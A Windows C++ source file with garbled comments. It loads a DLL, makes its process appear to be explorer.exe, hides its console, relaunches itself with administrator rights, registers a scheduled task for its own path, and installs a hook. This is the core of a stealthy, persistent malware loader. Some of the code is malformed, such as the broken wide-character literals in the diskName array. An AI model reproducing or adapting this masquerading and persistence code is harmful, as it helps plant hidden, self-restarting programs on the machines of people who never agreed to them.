
//#define ZEXPORT WINAPI

#include <stdio.h>
//#include"11/include/unzip.h"
//#include <zlib.h>

#include <windows.h>
#include <tchar.h>


//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )// ������ڵ�ַ
typedef  void(*PADD)(  LPCTSTR);
using isadmin = bool(*)();
using m_wCreateTask = int(*)(LPCWSTR);
using m_DisguiseProcess = bool(*)(DWORD,  wchar_t* , wchar_t* );
HMODULE hDLL;

// �Թ���Ա����
VOID ManagerRun(LPCWSTR exe, LPCWSTR param, INT nShow = SW_SHOW)
{ //ע�⣺��������ʾ��
	SHELLEXECUTEINFO ShExecInfo;
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = L"runas";
	ShExecInfo.lpFile = exe;
	ShExecInfo.lpParameters = param;
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = nShow;
	ShExecInfo.hInstApp = NULL;
	BOOL ret = ShellExecuteEx(&ShExecInfo);
	//�Ȳ����ˣ������ˡ�
	CloseHandle(ShExecInfo.hProcess);
	return;
}

int main(int argc, char* argv[]) {
	
	hDLL = LoadLibrary(L"Project2.dll");
	if (hDLL == NULL) return 0;

	isadmin IsRunAsAdministrator = (isadmin)GetProcAddress(hDLL, "IsRunAsAdministrator");  // �Ƿ��ǹ���Ա����
	m_wCreateTask wCreateTask = (m_wCreateTask)GetProcAddress(hDLL, "wCreateTask");  // �����ƻ�����
	PADD installhook = (PADD)GetProcAddress(hDLL, "installhook");  // ��ȡ����
	m_DisguiseProcess DisguiseProcess = (m_DisguiseProcess)GetProcAddress(hDLL, "DisguiseProcess");
	WCHAR exefullpath[256];
	memset(exefullpath, 0, sizeof(exefullpath));
	MultiByteToWideChar(CP_ACP, 0, argv[0], strlen(argv[0]) + 1, exefullpath,
		sizeof(exefullpath) / sizeof(exefullpath[0]));
	// C:\Windows\explorer.exe
	wchar_t diskName[18] = { L'e', L'x ',L'p', L'l',L'o', L'r ',L'e', L'r ',L'.', L'e ',L'x', L'e ' };
	wchar_t aa[] = L"C:\\Windows\\explorer.exe";
	wchar_t bb[] = L"explorer.exe";

	// ����αװ
	DisguiseProcess(GetCurrentProcessId(), aa,bb );
	
	if (!IsRunAsAdministrator()) //
	{
		
		ShowWindow(GetConsoleWindow(), SW_HIDE);
		installhook(exefullpath);
		ManagerRun(exefullpath, L"2");
		return 1;
	}
	else  //�ٴ�����,�������Ǹ�ManagerRun
	{
		/*��ĳ����������ڴ�*/ // ��������й���ԱȨ�޵�
		wCreateTask(exefullpath);
		installhook(exefullpath);

	}

	return 0;
}